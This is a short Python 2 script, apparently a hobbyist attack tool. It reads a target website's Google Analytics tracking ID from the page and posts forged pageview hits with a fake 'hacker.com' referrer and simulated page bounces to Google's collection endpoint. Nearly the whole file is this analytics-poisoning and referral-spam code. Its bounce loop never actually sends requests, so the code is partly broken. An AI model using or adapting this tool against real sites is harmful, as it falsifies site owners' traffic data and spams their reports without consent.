import sys
import requests
import re
import time
import random
import google

#https://developers.google.com/analytics/devguides/collection/protocol/v1/
#https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid

def main():
    #test = analytics_request(document_referrer="http://hackerzzz.com", document_location="https://zonksec.com/me",tracking_id='UA-72589501-1',client_id=559,geo_id='1007949')
    #test.send()

    # search_results = google.search(query='site:zonksec.com',num=10,stop=1)
    # test =[]
    # for result in search_results:
    #     test.append(result)
    # print test

    test = single_page_attack(target_url='http://zonksec.com',referral_url='http://hacker.com',client_id=402,bounces=100)
    print len(test.bounce_urls)
    #test.run()
class single_page_attack:
    def __init__(self, target_url, client_id, referral_url, bounce_urls = None, page_delay=5, page_delay_jitter=10, bounces=0):
        self.target_url = target_url
        self.client_id = client_id
        self.referral_url = referral_url
        self.page_delay = page_delay
        self.page_delay_jitter = page_delay_jitter
        self.bounces = bounces
        self.bounce_urls = bounce_urls

        #if bounce urls are need, collects them.
        if self.bounces <= 10 and self.bounces != 0 and self.bounce_urls is None:
            self.bounce_urls = []
            search_results = google.search(query="site:"+self.target_url, num=10,stop=1)
            for result in search_results:
                self.bounce_urls.append(str(result))
        elif self.bounces > 10 and self.bounce_urls is None:
            self.bounce_urls = []
            search_results = google.search(query="site:"+self.target_url, num=self.bounces,stop=1)
            for result in search_results:
                self.bounce_urls.append(str(result))


    def run(self):
        target_request = analytics_request(document_location=self.target_url,document_referrer=self.referral_url,client_id=self.client_id)
        target_request.send()
        bounce_count = 0
        last_page = self.target_url
        while (bounce_count < self.bounces):
            time.sleep(self.page_delay)
            bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id)
            last_page = bounce_request.document_location
            bounce_count += 1



class analytics_request:
    def __init__(self,document_referrer,document_location,client_id,tracking_id=None,version=1,hit_type='pageview',user_agent ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',geo_id ='US', anon_ip =1):
        self.version = version
        self.tracking_id = tracking_id
        self.client_id = client_id
        self.hit_type = hit_type
        self.user_agent = user_agent
        self.geo_id = geo_id
        self.document_referrer = document_referrer
        self.document_location = document_location
        self.anon_ip = anon_ip

        if self.tracking_id is None:
            page = requests.get(document_location)
            m = re.search("'(UA-(.*))',", page.text)
            self.tracking_id = str(m.group(1))

    def send(self):
        params = {}
        params['v'] = self.version
        params['tid'] = self.tracking_id
        params['cid'] = self.client_id
        params['t'] = self.hit_type
        params['aip'] = self.anon_ip
        params['dl'] = self.document_location
        params['dr'] =self.document_referrer
        params['geoid'] = self.geo_id
        params['ua'] = self.user_agent

        r = requests.post('https://www.google-analytics.com/collect', data=params)
        print(r)


main()